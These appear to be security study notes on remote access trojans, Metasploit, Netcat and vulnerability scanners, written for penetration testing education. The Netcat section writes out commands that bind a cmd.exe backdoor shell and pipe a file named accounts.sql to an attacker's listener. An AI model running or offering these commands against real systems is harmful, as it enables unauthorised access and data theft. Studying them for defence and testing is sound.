**A remote access trojan (RAT)** is malware that gives an adversary the means of remotely accessing the network.
From the perspective of security posture assessment, a penetration tester might want to try to establish this sort of connection and attempt to send corporate information over the channel (data exfiltration).
An exploitation framework uses the vulnerabilities identified by an automated scanner and launches scripts or software to attempt to deliver matching exploits.
Depending on the access obtained via the exploit, the payload code may be used to open a command shell, create a user, install software, and so on.
The best-known exploit framework is **Metasploit** 
# NETCAT
- Netcat can be used for port scanning and fingerprinting, establish connections with remote machines.
- To configure Netcat as a backdoor, you first set up a listener on the victim system (IP 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler: 
   `nc -l -p 666 -e cmd.exe`
- The following command connects to the listener and grants access to the terminal: 
   `nc 10.1.0.1 666`
Used the other way around, Netcat can be used to receive files.
• For example, on the target system the attacker runs the following: 
`type accounts.sql | nc 10.1.0.192 6666 `
• On the handler (IP 10.1.0.192), the attacker receives the file using the following command:
`nc -l -p 6666 > accounts.sql`

# VULNERABILITY SCAN TYPES
**Network Vulnerability Scanner** :
A network vulnerability scanner, such as Tenable Nessus (tenable.com/products/nessus or OpenVAS (openvas.org ) ), is designed to test network hosts, including client PCs, mobile devices, servers, routers, and switches.
It examines an organization's on-premises systems, applications, and devices and compares the scan results to configuration templates plus lists of known vulnerabilities. 
Typical results from a vulnerability assessment will identify missing patches, deviations from baseline configuration templates, and other related vulnerabilities.

**Web Application Scanners** :
Tools such as Nikto (cirt.net/Nikto2 ) look for known web exploits, such as SQL injection and cross-site scripting (XSS), and may also analyze source code and database security to detect unsecure programming practices.
